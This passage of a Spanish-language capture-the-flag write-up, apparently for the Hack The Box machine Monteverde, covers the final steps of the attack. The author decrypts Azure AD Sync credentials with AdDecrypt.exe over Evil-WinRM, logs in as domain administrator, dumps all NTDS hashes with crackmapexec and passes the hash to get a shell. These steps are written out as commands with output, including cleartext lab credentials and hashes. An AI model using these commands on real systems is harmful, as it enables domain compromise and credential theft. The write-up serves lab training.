-a----        8/31/2018   4:54 PM         507264 Microsoft.Online.Deployment.Framework.dll
-a----        8/31/2018   4:54 PM          82304 Microsoft.Online.Deployment.PowerShell.dll
-a----        8/31/2018   4:54 PM         116608 Microsoft.Online.PasswordSynchronization.Cryptography.dll
-a----        8/31/2018   4:54 PM         136248 Microsoft.Online.PasswordSynchronization.dll
-a----        8/31/2018   4:54 PM          23424 Microsoft.Online.PasswordSynchronization.Resources.dll
-a----        8/31/2018   4:54 PM         196664 Microsoft.Online.PasswordSynchronization.Rpc.dll
-a----        8/31/2018   4:53 PM        3540032 Microsoft.ServiceBus.dll
-a----        8/31/2018   4:53 PM        2556984 miiserver.exe
-a----        8/31/2018   4:41 PM           5830 miiserver.exe.config
-a----        8/31/2018   4:53 PM          99896 miiskmu.exe
-a----        8/31/2018   4:55 PM          85568 mixedmodeutils.dll
-a----        8/31/2018   4:55 PM         360504 mmscntrl.dll
-a----        8/31/2018   4:55 PM          97848 mmsevent.dll
-a----        8/31/2018   4:55 PM         725048 mmsmaad.dll
-a----        8/31/2018   4:55 PM         567352 mmsmaext.dll
-a----        8/31/2018   4:55 PM        1424256 mmsmastate.dll
-a----        8/31/2018   4:55 PM         431160 mmsmaxml.dll
-a----        8/31/2018   4:55 PM          31288 mmsperf.dll
-a----        8/31/2018   4:41 PM           5686 mmsperf.h
-a----        8/31/2018   4:41 PM          12162 mmsperf.ini
-a----        8/31/2018   4:55 PM          37432 mmsperfmon.dll
-a----        8/31/2018   4:55 PM         151096 mmsps.dll
-a----        8/31/2018   4:55 PM         528768 mmsscpth.dll
-a----        8/31/2018   4:55 PM          33152 MMSSERVERRCW.dll
-a----        8/31/2018   4:55 PM         520064 mmsuihlp.dll
-a----        8/31/2018   4:55 PM         222776 mmsutils.dll
-a----        8/31/2018   4:41 PM            978 mmswmi-x.mof
-a----        8/31/2018   4:55 PM         133688 mmswmi.dll
-a----        8/31/2018   4:41 PM           8441 mmswmi.mof
-a----        8/31/2018   4:55 PM         103496 PasswordHashConnectorManager.dll
-a----        8/31/2018   4:55 PM          37952 PasswordHashSyncExtension.dll
-a----        8/31/2018   4:53 PM          44104 Security.Cryptography.dll
-a----        8/31/2018   4:55 PM        1462328 storechk.exe
-a----        8/31/2018   4:54 PM          62008 SyncClrhost.dll
-a----        8/31/2018   4:54 PM         135736 SyncRuleExpressions.dll
-a----        8/31/2018   4:54 PM         172088 SyncRulesEngine.dll
-a----        8/31/2018   4:54 PM         200760 SyncSetupUtl.dll
-a----        8/31/2018   4:54 PM          26176 Tracing.dll
-a----        8/31/2018   4:41 PM          16510 Tracing.man


*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin>
```

>ADSync generalmente se ejecuta como un servicio en un servidor designado dentro de la infraestructura de la red local. Es responsable de mantener la sincronización continua entre el directorio activo local y Azure AD, asegurando que cualquier cambio realizado en uno de los directorios se refleje adecuadamente en el otro.

- Si descomprimimos el `.zip` vemos que obtenemos un `.exe` y un `.ddl`.

```bash
➜  content 7z x AdDecrypt.zip

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 152818 bytes (150 KiB)

Extracting archive: AdDecrypt.zip
--
Path = AdDecrypt.zip
Type = zip
Physical Size = 152818

Everything is Ok

Files: 2
Size:       349096
Compressed: 152818
➜  content ls
AdDecrypt.exe  AdDecrypt.zip  azure.xml  mcrypt.dll  users.txt
```

- En el post nos dicen que tenemos que subir los 2 archivos.

```bash
*Evil-WinRM* PS C:\programdata> dir


    Directory: C:\programdata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   4:12 PM                AADConnect
d---s-         1/3/2020   4:47 AM                Microsoft
d-----        3/31/2024  11:35 AM                regid.1991-06.com.microsoft
d-----        9/15/2018  12:19 AM                SoftwareDistribution
d-----         1/2/2020   9:15 PM                USOPrivate
d-----         1/2/2020   9:15 PM                USOShared
d-----         1/2/2020   9:37 PM                VMware
d-----         1/2/2020   2:35 PM                VsTelemetry
-a----        3/31/2024   1:22 PM          14848 AdDecrypt.exe
-a----        3/31/2024   1:22 PM         334248 mcrypt.dll
```

- Ahora lo ejecutamos para ver la contraseña en texto plano.

```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\programdata\AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

## root.txt

- Ahora ya nos podemos conectar gracias a que el ejecutable descifro las credenciales almacenadas dentro de la configuración `Azure AD Sync`.

```bash
➜  content evil-winrm -i 10.129.228.111 -u administrator -p d0m@in4dminyeah!

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megabank\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
026476efa67f5ba4e205392bb78817e4
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## Extra

- Aquí tenemos los hashes NT de todos los usuarios.

```bash
➜  ~ crackmapexec smb 10.129.228.111 -u administrator -p d0m@in4dminyeah! --nt
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\administrator:d0m@in4dminyeah! (Pwn3d!)
SMB         10.129.228.111  445    MONTEVERDE       [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.228.111  445    MONTEVERDE       Administrator:500:aad3b435b51404eeaad3b435b51404ee:100a42db8caea588a626d3a9378cd7ea:::
SMB         10.129.228.111  445    MONTEVERDE       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.228.111  445    MONTEVERDE       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3480c0ed5001f14fa7a49fdf016043ff:::
SMB         10.129.228.111  445    MONTEVERDE       AAD_987d7f2f57d2:1104:aad3b435b51404eeaad3b435b51404ee:599716220acac74a2d9049230d3a8b06:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL\mhope:1601:aad3b435b51404eeaad3b435b51404ee:f875f9a71efc6b0ee93dd906aedbc8b6:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL\SABatchJobs:2602:aad3b435b51404eeaad3b435b51404ee:fd980edb4732d8175a52a9b5e1520bc1:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL\svc-ata:2603:aad3b435b51404eeaad3b435b51404ee:d192ea098c69b7d26c50808a5ac75bea:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL\svc-bexec:2604:aad3b435b51404eeaad3b435b51404ee:2e4de9439cfd99f861dec8fc460c47e3:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL\svc-netapp:2605:aad3b435b51404eeaad3b435b51404ee:6bd17d9707c3da465b96cdf0e1a3a4d6:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL\dgalanos:2613:aad3b435b51404eeaad3b435b51404ee:7a695f4cc64a302d8e53da58f0885736:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL\roleary:2614:aad3b435b51404eeaad3b435b51404ee:cb3fa0132c099c5b29c30ef128e90ad8:::
SMB         10.129.228.111  445    MONTEVERDE       MEGABANK.LOCAL\smorgan:2615:aad3b435b51404eeaad3b435b51404ee:3a2b291c4291a1063a4b32e1770e5388:::
SMB         10.129.228.111  445    MONTEVERDE       MONTEVERDE$:1000:aad3b435b51404eeaad3b435b51404ee:2e06005800e9c8981d41f5c109ca4c03:::
SMB         10.129.228.111  445    MONTEVERDE       [+] Dumped 13 NTDS hashes to /home/miguel/.cme/logs/MONTEVERDE_10.129.228.111_2024-03-31_143351.ntds of which 12 were added to the database
```

- También nos podemos conectar con el hash.

```bash
➜  content evil-winrm -i 10.129.228.111 -u administrator -H 100a42db8caea588a626d3a9378cd7ea

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
